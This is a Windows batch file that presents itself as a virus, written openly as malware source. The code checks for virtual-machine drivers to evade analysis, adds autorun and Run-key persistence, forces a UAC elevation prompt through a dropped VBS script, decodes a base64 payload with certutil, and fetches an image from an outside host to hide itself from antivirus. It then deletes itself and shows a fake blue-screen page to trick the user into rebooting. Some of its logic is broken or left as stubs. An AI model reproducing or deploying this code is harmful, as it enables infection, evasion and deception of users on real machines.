@echo off

:: remove this line if...
:: ... you fully accept, that if you execute this, and anything
:: on your machine gets modified or even damaged, I will not be 
:: responsible. Using this batchfile for illegal purposes is
:: illegal xD
goto :terminate

:: check if the virus is running on a VM. If so, kill it.
if exist "C:\windows\system32\drivers\vmci.sys" (goto terminate)
if exist "C:\windows\system32\drivers\vmhgfs.sys" (goto terminate)
if exist "C:\windows\system32\drivers\vmmouse.sys" (goto terminate)
if exist "C:\windows\system32\drivers\vmscsi.sys" (goto terminate)
if exist "C:\windows\system32\drivers\vmusbmouse.sys" (goto terminate)
if exist "C:\windows\system32\drivers\vmx_svga.sys" (goto terminate)
if exist "C:\windows\system32\drivers\vmxnet.sys" (goto terminate)
if exist "C:\windows\system32\drivers\VBoxMouse.sys" (goto terminate) else (goto main)

:: ternmination routine
:terminate
  exit

:: startup persistence part
(
  echo [AutoRun]
  echo open="powershell.exe /c 'cmd.exe %1' -windowstyle hidden"
) >> "C:\Autorun.inf"
(
  echo "Windows Registry Editor Version 5.00"
  echo "[Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]"
  echo @="powershell.exe /c 'cmd.exe %TEMP%\TMPMAIN.bat' -windowstyle hidden"
) >> "%TEMP%\TMPREG.reg"

:: this is the funny part
:main

:: UAC privilege escalation
:queryprivilege

NET FILE 1>NUL 2>NUL

:: Check if the current file is running with 0 = admin rights
if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto gainprivileges )

:: Gain privileges routine
:gainprivileges
if '%1'=='ELEV' (echo ELEV & shift /1 & goto gotPrivileges)

:: invoke UAC
setlocal DisableDelayedExpansion
set "batchPath=%~0"
setlocal EnableDelayedExpansion

:: drop a little vbs script for the elevation
echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\OEgetPrivileges.vbs"
echo args = "ELEV " >> "%temp%\OEgetPrivileges.vbs"
echo For Each strArg in WScript.Arguments >> "%temp%\OEgetPrivileges.vbs"
echo args = args ^& strArg ^& " "  >> "%temp%\OEgetPrivileges.vbs"
echo Next >> "%temp%\OEgetPrivileges.vbs"
echo UAC.ShellExecute "!batchPath!", args, "", "runas", 1 >> "%temp%\OEgetPrivileges.vbs"

:: compile the vbs snippet
"%SystemRoot%\System32\WScript.exe" "%temp%\OEgetPrivileges.vbs" %*

:: if privileges are gained...
:gotPrivileges
if '%1'=='ELEV' shift /1
setlocal & pushd .
cd /d %~dp0
:: End UAC privilege escalation

:: dropping a base64 encoded vbs snippet for later...
(
  echo U2V0IG9iakFyZ3MgPSBXU2NyaXB0LkFyZ3VtZW50cwpTZXQgRlMgPSBDcmVhdGVPYmplY3QoIlNjcmlwdGluZy5
  echo GaWxlU3lzdGVtT2JqZWN0IikKSW5wdXRGb2xkZXIgPSBGUy5HZXRBYnNvbHV0ZVBhdGhOYW1lKG9iakFyZ3MoMC
  echo kpClppcEZpbGUgPSBGUy5HZXRBYnNvbHV0ZVBhdGhOYW1lKG9iakFyZ3MoMSkpCkNyZWF0ZU9iamVjdCgiU2Nya
  echo XB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKS5DcmVhdGVUZXh0RmlsZShaaXBGaWxlLCBUcnVlKS5Xcml0ZSAiUEsi
  echo ICYgQ2hyKDUpICYgQ2hyKDYpICYgU3RyaW5nKDE4LCB2Yk51bGxDaGFyKQpTZXQgb2JqU2hlbGwgPSBDcmVhdGV
  echo PYmplY3QoIlNoZWxsLkFwcGxpY2F0aW9uIikKU2V0IHNvdXJjZSA9IG9ialNoZWxsLk5hbWVTcGFjZShJbnB1dE
  echo ZvbGRlcikuSXRlbXMKb2JqU2hlbGwuTmFtZVNwYWNlKFppcEZpbGUpLkNvcHlIZXJlKHNvdXJjZSkKRG8gVW50a
  echo Wwgb2JqU2hlbGwuTmFtZVNwYWNlKCBaaXBGaWxlICkuSXRlbXMuQ291bnQgPSBvYmpTaGVsbC5OYW1lU3BhY2Uo
  echo IElucHV0Rm9sZGVyICkuSXRlbXMuQ291bnQKICAgIFdTY3JpcHQuU2xlZXAgMjAwCkxvb3A=
  
  :: echo Set objArgs = WScript.Arguments
  :: echo Set FS = CreateObject("Scripting.FileSystemObject")
  :: echo InputFolder = FS.GetAbsolutePathName(objArgs(0))
  :: echo ZipFile = FS.GetAbsolutePathName(objArgs(1))
  ::
  :: echo CreateObject("Scripting.FileSystemObject").CreateTextFile(ZipFile, True).Write "PK" & Chr(5) & Chr(6) & String(18, vbNullChar)
  :: 
  :: echo Set objShell = CreateObject("Shell.Application")
  ::
  :: echo Set source = objShell.NameSpace(InputFolder).Items
  ::
  :: echo objShell.NameSpace(ZipFile).CopyHere(source)
  ::
  :: echo Do Until objShell.NameSpace( ZipFile ).Items.Count = objShell.NameSpace( InputFolder ).Items.Count
  ::   echo WScript.Sleep 200
  :: echo Loop
) >> %TEMP%\TMP1234567.TMP

:: decode the base64 file into TMP234567.VBS
certutil -decode %TEMP%\TMP1234567.TMP %TEMP%\TMP234567.VBS

:: run the vbs snippet with the arg pwd and itselfe
:: will create steganographic persistence
:: this batchfile will be compressed into a .png file, so that AV won't detect anything xD
mkdir TMPIMAGE | cd
wget https://lh3.googleusercontent.com/proxy/9gJBn4JEN31e0ekBIsLjK8r0BNDNcesUASSphGSoO-Sz01OARu4stQVxbSsSG8sc2VYDYbTr0x898H0E_cQV98S1exrdNKzxiksnCQ4h39btEZLQv5JjSdz7l3UkPSQQknLESOwFeA .\image.png
cscript %TEMP%\TMP234567.VBS ./TMPIMAGE %1 

:: melt this script
del /f/Q %1

:: mbr bin drops asm 
:: mbr drop end

:: overwrite mbr 
:: end overwrite

:: force reboot
(
  echo ^<html^>^<head^>^<title^>Windows IRQ Error^</title^> 
  echo.
  echo ^<hta:application
  echo applicationname="IRQ Not Less or Equal"
  echo version="1.0" 
  echo maximizebutton="no"
  echo minimizebutton="no"
  echo sysmenu="no"
  echo Caption="no" 
  echo windowstate="maximize"/^>
  echo.
  echo ^</head^>^<body bgcolor="#000088" scroll="no"^>
  echo ^<font face="Lucida Console" size="4" color="#FFFFFF"^>
  echo ^<p^>A problem was detected and Windows was shut down to prevent damage to your computer.^</p^>
  echo.
  echo ^<p^>DRIVER_IRQ_NOT_LESS_OR_EQUAL^</p^>
  echo.
  echo ^<p^>If this is the first time you see this shutdown error screen, restart your computer. If this screen still appears, follow these steps:^</p^>
  echo.
  echo ^<p^>Check your computer for viruses. Remove any newly installed hard drive or hard drive controller. check your hard drive to make sure it is properly configured and terminated.^</p^>
  echo.
  echo ^<p^>Run CHKDSK / F to check for damage to your hard drive then restart your computer.^</p^>
  echo.
  echo ^<p^>Informations techiques:^</p^>
  echo.
  echo ^<p^>*** STOP: 0x000000D1 (0x0000000C,0x00000002,0x00000000,0xF86B5A89)^</p^>
  echo.
  echo.
  echo ^<p^>***       gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^>
  echo.
  echo ^<p^>Beginning dump of physical memory^</p^>
  echo ^<p^>Physical memory dump complete.^</p^>
  echo ^<p^>Contact your system administrator or technical support group for further assistance.^</p^>
  echo.
  echo.
  echo ^</font^>
  echo ^</body^>^</html^>
) >> wersvc.hta

:: let the user do the reboot part ;)
start "" "wersvc.hta"

:: custom mbr data segment with message to the user should show up  

:: end
goto :terminate
